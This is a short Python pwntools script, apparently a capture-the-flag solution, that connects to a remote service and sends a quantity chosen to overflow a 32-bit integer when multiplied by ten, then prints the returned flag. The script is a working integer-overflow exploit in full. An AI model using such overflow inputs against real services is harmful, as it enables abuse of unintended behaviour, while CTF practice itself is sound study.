from pwn import *

r = remote('140.113.24.241', 30170)

r.recvuntil(b'choice:\n')

# send 1 first
r.sendline(b'1')

r.recvuntil(b'amount:\n')

# then send amount to make 10*amount 
# greater than 2147483647
# less than 4294967296
r.sendline(b'429496729')

# receive the flag
result = r.recvuntil(b'}').split()
print(result[-1].decode())

r.close()
